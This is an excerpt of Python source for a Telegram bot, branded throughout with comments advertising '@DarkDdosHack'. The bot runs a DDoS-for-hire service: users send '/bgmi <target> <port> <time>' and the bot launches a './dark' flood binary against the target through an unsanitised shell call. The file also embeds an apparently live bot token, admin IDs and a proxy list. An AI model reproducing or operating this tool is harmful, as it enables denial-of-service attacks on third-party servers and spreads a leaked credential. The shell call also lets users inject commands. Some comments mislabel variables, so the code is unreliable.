...
# Join :- @DarkDdosHack #bgmiddoserpython
...
# Join :- @DarkDdosHack #from keep_alive import keep_alive
# Join :- @DarkDdosHack #keep_alive()
# Join :- @DarkDdosHack # insert your Telegram bot token here
bot = telebot.TeleBot('7954860124:AAGtdELkkMxt_rze2uir1yWcZSlcz6qQ9-Y')

# Join :- @DarkDdosHack # Admin user IDs
admin_id = ["7885196586","5344691638"]

# Join :- @DarkDdosHack # File to store allowed user IDs
USER_FILE = "users.txt"

# Join :- @DarkDdosHack # File to store command logs
LOG_FILE = "log.txt"


# Join :- @DarkDdosHack # List of proxy addresses
PROXIES = [
...
"https://134.73.65.97:6649"
    # Join :- @DarkDdosHack # Add more proxy addresses as needed
]
...
# Join :- @DarkDdosHack # Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Join :- @DarkDdosHack # Check if line is not empty
...
# Join :- @DarkDdosHack # Function to log command to the file
def log_command(user_id, target, port, time):
    ...
    with open(LOG_FILE, "a") as file:  # Join :- @DarkDdosHack # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Join :- @DarkDdosHack # Function to clear logs
def clear_logs():
    try:
...
# Join :- @DarkDdosHack # Function to record command logs
...
# Join :- @DarkDdosHack # Function to handle the reply when free users run the /bgmi command
...
# Join :- @DarkDdosHack # Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Join :- @DarkDdosHack # Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Join :- @DarkDdosHack # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Join :- @DarkDdosHack # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 120:
                ...
                bot.reply_to(message, response)
                return
            # Join :- @DarkDdosHack # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Join :- @DarkDdosHack # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Join :- @DarkDdosHack # Convert time to integer
            time = int(command[3])  # Join :- @DarkDdosHack # Convert port to integer
            if time > 240:
                response = "Error: Time interval must be less than 180."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Join :- @DarkDdosHack # Call start_attack_reply function
                full_command = f"./dark {target} {port} {time}"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Join :- @DarkDdosHack # Updated command syntax
    else:
...
# Join :- @DarkDdosHack # Add /mylogs command to display logs recorded for bgmi and website commands
...
# Join :- @DarkDdosHack # Import the 'time' module for sleep functionality
import time
